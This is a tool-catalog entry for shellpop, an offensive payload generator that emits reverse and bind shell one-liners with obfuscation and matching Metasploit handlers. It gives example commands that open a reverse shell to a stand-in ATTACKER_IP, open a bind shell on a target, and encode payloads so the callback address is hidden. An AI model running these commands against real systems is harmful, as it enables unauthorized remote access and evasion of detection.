---
name: "shellpop"
categories:
  - blackarch-automation
version: "148.a145349"
homepage: "https://github.com/0x00-0x00/ShellPop"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-26"
build-system: scripts
license: MIT
meta-checked: "2026-11-09"
github-repo: "0x00-0x00/ShellPop"
github-status: "gone"
github-match: "exact"
gh-checked: "2026-11-09"
worth: 3.1
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-stars: 1486
github-pushed: "2019-04-02"
github-archived: false
github-issues: 6
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# shellpop

> "Shellpop is all about popping shells": a payload generator that emits reverse/bind shell one-liners (Python, PowerShell, PHP, Ruby, Perl, Netcat, socat, AWK, Nishang ICMP, ...) with built-in obfuscation, encoders and matching Metasploit handlers.

## What it's for

Generating a shell command and the matching listener in one step. Beyond picking language and direction, shellpop applies payload hygiene automatically: variable names are renamed to random tokens on every payload, and optional transforms include IPfuscation (rewriting the callback IP/port as mixed decimal/octal/hex arithmetic), base64 with a decode wrapper, URL encoding for HTTP delivery, and XOR. For PowerShell there are 32/64-bit and random-case variants; `--handler` spins up the appropriate Metasploit multi/handler locally, and `--stager` serves staged payloads over HTTP. Payloads can go straight to the clipboard with `--clip`. Scope notes: it emits one-liners and staged PowerShell — it is not a full C2 — and it is a Python 2 program (0.3.5, the final release), so it needs a Python 2 interpreter and metasploit-framework installed for its handler feature. The original repository URL is listed as gone in the vault metadata, but the upstream source (github.com/0x00-0x00/ShellPop) is reachable and remains what BlackArch packages.

*No corpus evidence — derived from upstream documentation and source.*

## Typical use cases

### Enumerate available payloads

```
shellpop --list
```

Outcome: prints the numbered catalog of payloads, split into bind and reverse shells with their language/protocol (for example `Python TCP +pty`, `Windows Powershell Nishang TCP`, `socat UDP`), so you can pick the index to generate in the next step.

### Generate a reverse shell with a matching handler

```
shellpop --number 1 --reverse --host ATTACKER_IP --port 443 --handler --clip
```

Outcome: emits the Python TCP reverse shell (reverse payload #1) with randomized variable names, sets up the matching Metasploit multi/handler listener locally, and copies the payload string to your clipboard ready to paste on the target. `--host`/`--port` point at your machine for reverse shells; for bind shells omit `--host` and the port is the target's listener.

### Generate a bind shell on the target

```
shellpop --number 1 --bind --port 1337
```

Outcome: prints a one-liner that opens a listener on the target's port 1337; connect to it from your machine (`nc TARGET 1337`) — no handler or callback host needed since the target serves the connection.

### Deliver a payload that survives transport mangling

```
shellpop --number 3 --reverse --host ATTACKER_IP --port 443 --base64 --ipfuscate
```

Outcome: the payload is base64-encoded with a self-decoding wrapper (survives quote-stripping) and its embedded IP and port are rewritten as mixed decimal/octal/hex arithmetic so the literal callback address never appears in the string — combine with `--urlencode` when the payload travels inside a URL, and with `--obfuscate-small` when command-length limits make full randomization too big.
